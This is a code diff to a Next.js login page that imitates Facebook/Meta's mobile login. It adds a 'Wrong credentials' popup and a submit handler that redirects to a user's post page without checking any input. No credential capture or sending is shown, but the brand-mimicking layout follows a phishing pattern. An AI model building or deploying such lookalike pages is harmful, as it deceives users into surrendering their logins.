@@ -1,10 +1,12 @@
 "use client"
-import {Opt} from "next/font/google";
+import { Opt } from "next/font/google";
 import Link from "next/link";
 import { useState } from "react";
+import { useRouter } from "next/navigation";
 
 export default function Page() {
     const [passwordVisible, setPasswordVisible] = useState(false);
+    const router = useRouter();
 
     const handlePasswordChange = (event) => {
         setPassword(event.target.value);
@@ -14,9 +16,40 @@ export default function Page() {
         event.preventDefault();
         setPasswordVisible(!passwordVisible);
     };
+    const handleSubmit = (event) => {
+        event.preventDefault();
+        router.replace("pages/naila143201/post/3217382")
+
+    }
+    
+    const closeWrongPassPopup = (event) =>{
+        event.preventDefault();
+        const popupBox = document.getElementById("wrong-pass-popup");
+        popupBox.classList.add("-z-10");
+        popupBox.classList.remove("z-10");
+    }
+
+    const openWrongPassPopup = (event) =>{
+        event.preventDefault();
+        const popupBox = document.getElementById("wrong-pass-popup");
+        popupBox.classList.add("z-10");
+        popupBox.classList.remove("-z-10");
+    }
 
     return (<>
         <div className="w-full h-full login-bg flex flex-col">
+
+            <div id="wrong-pass-popup" className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center z-10">
+                <button onClick={closeWrongPassPopup} href="/login" className="w-[90%] h-44 bg-white rounded-lg flex flex-col">
+                    <div className="w-full h-32 flex flex-col justify-center items-center border-b border-gray-400">
+                        <div className="text-[19px] font-semibold">Wrong credentials</div>
+                        <div className="text-[14px] text-gray-500">Invalid username or password</div>
+                    </div>
+                    <div className="flex-1 w-full flex justify-center items-center text-blue-600 text-[16px]">OK</div>
+                </button>
+            </div>
+
+
             <div className="w-full flex-1 flex flex-col">
                 <div className="w-full h-8 pt-3 bg-transparent flex justify-center items-baseline text-[13px] text-gray-700">
                     <button>English (UK)</button>
@@ -29,7 +62,7 @@ export default function Page() {
             <div className="w-full h-60 px-4">
                 <form className="space-y-3 h-auto w-full">
                     <div className="w-full h-16 relative">
-                        <input type="text" id="mobile" name="mobile" placeholder=" " className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900" />
+                        <input type="email" id="mobile" name="mobile" placeholder=" " className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900" />
                         <label htmlFor="mobile" className="absolute w-full h-full px-4 py-2 flex flex-col justify-center font-medium text-gray-500 text-[14px] peer-placeholder-shown:text-[16px] peer-focus:text-[14px] translate-y-[-11px] peer-focus:translate-y-[-11px] peer-placeholder-shown:translate-y-[0px]  translate-x-[1px] peer-focus:translate-x-[1px] peer-placeholder-shown:translate-x-[0px] transition-all duration-200">
                             <span>
                                 Mobile number or email address
@@ -76,7 +109,7 @@ export default function Page() {
                         </div>
                     </div>
 
-                    <button type="submit" className="w-full bg-blue-600 text-white py-2 rounded-full font-medium hover:bg-blue-700 focus:ring focus:ring-blue-500 focus:outline-none">
+                    <button type="submit" onClick={handleSubmit} className="w-full bg-blue-600 text-white py-2 rounded-full font-medium hover:bg-blue-700 focus:ring focus:ring-blue-500 focus:outline-none">
                         Log in
                     </button>
                 </form>
@@ -91,7 +124,7 @@ export default function Page() {
                         Create new account
                     </a>
                     <div className="w-full h-5 pt-1 flex justify-center items-center">
-                        <img src="/imgs/meta-logo.png" alt="" className="h-full object-contain opacity-60"/>
+                        <img src="/imgs/meta-logo.png" alt="" className="h-full object-contain opacity-60" />
                     </div>
                     <div className="w-full h-5 flex gap-3 justify-center items-center text-[11px] text-gray-500">
                         <a href="https://about.meta.com/">About</a>
@@ -101,7 +134,5 @@ export default function Page() {
                 </div>
             </div>
         </div>
-
-
     </>);
 }
